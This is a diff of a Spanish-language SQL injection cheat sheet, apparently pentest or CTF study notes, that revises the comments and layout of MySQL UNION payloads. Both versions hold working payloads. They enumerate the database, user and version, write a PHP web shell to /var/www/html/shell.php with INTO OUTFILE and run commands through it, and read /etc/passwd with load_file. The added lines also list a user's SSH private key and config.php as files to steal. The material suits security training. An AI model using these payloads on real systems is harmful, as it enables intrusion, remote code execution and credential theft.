@@ -108,13 +108,14 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 ```mysql
 # MYSQL
 
-❯ union select 1,2,3 --+                              # Determinar el numero de columnas 
-❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
-❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
-❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
-❯ ' union select database(),NULL,user() -- -          # Queremos que muestre el nombre de la base de datos actual en uso, tambien podemos ver al usuario quien corre la base de datos
+❯ union select 1,2,3 --+                 # Determinar el numero de columnas 
+❯ ' union select 1,2,3 -- -              
+❯ ' union select NULL,NULL,NULL -- -     # Aveces solo acepta NULL en lugar de numeros
+❯ ' union select "test",NULL,NULL -- -   # Podemos colocar texto 
+❯ ' union select database()-- -          # Mostrar el nombre de la base de datos actual en uso
+❯ ' union select user() -- -             # Mostrar el nombre del usuario 
 
-❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
+❯ ' union select NULL,@@version-- -      # Mirar la version de MySQL y Microsoft
 ```
 
 ## Conocer las DBs existentes
@@ -173,20 +174,22 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 ## Subir un archivo a una ruta especifica de la maquina victima
 
 ```mysql 
-# Subir un achivo que contiene codigo PHP malicioso en una ruta especifica para hacer ejecucion remota de comandos 'RCE' 
-
+# Subir un achivo PHP malicioso en una ruta especifica para RCE
 ❯ ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php" 
 
-# Ahora vamos a la ruta y con el archov que hemos subido, podemos ejecutar comandos de la siguiente manera:
-	shell.php?cmd=whoami
-# Podemos meter los comandos pra crear la 'Revershell'
+# Ir a la ruta y con el archivo subido, se puede ejecutar comandos de la siguiente manera:
+❯ shell.php?cmd=whoami
 ```
 
 ## Leer (cargar) archivos de la maquina victima 
 
 ```mysql 
-❯ ' union select load_file("/etc/passwd")-- -                  # Leer el '/etc/passwd' de la maquina victima 
-❯ ' union select load_file("/home/user/.ssh/id_rsa")-- -       # Leer el 'id_rsa' del usuario de la maquina victima
+❯' union select load_file("/etc/passwd")-- -   # Leer el '/etc/passwd' de la máquina víctima 
+
+Rutas:
+- /home/user/.ssh/id_rsa       # Leer el 'id_rsa' del usuario de la máquina víctima
+- /home/user/user.txt          # Leer la flag 
+- /var/www/html/config.php     # Leer la condiguración de config  
 ```
 
 ## Blind Boolean
